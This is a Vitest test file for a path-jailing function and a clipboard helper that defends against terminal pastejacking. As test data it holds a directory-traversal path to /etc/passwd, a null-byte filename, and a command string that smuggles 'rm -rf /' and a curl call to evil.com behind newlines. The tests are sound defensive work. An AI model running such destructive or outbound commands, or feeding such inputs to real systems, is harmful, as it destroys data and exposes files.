import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { resolveSafeVaultPath } from "@/lib/du/core/path-jail";
import { copyTerminalCommand, copyToClipboard } from "@/lib/clipboard";
import path from "node:path";
import os from "node:os";

describe("Security Core & Path Jailing (SEC-01)", () => {
  const tmpDir = os.tmpdir();

  it("should allow safe subpaths within base directory", () => {
    const resolved = resolveSafeVaultPath("subfolder/note.md", tmpDir);
    expect(resolved).toBeDefined();
    expect(resolved.startsWith(tmpDir)).toBe(true);
  });

  it("should reject parent directory traversal (..)", () => {
    expect(() => {
      resolveSafeVaultPath("../../../etc/passwd", tmpDir);
    }).toThrow(/Directory traversal attempt detected/);
  });

  it("should reject null bytes in subpath", () => {
    expect(() => {
      resolveSafeVaultPath("note.md\0.exe", tmpDir);
    }).toThrow(/Illegal path characters detected/);
  });

  it("should reject drive colons in subpath", () => {
    expect(() => {
      resolveSafeVaultPath("C:/Windows/win.ini", tmpDir);
    }).toThrow(/Illegal path characters detected/);
  });
});

describe("Terminal Pastejacking Defense (SEC-03)", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("should strip newlines from terminal commands completely", async () => {
    const writeTextMock = vi.fn().mockResolvedValue(undefined);
    vi.stubGlobal("navigator", {
      clipboard: {
        writeText: writeTextMock,
      },
    });

    const maliciousCommand = "pnpm test\r\nrm -rf /\ncurl http://evil.com";
    const res = await copyTerminalCommand(maliciousCommand);
    expect(res.success).toBe(true);
    expect(writeTextMock).toHaveBeenCalledWith("pnpm test rm -rf / curl http://evil.com");
  });
});
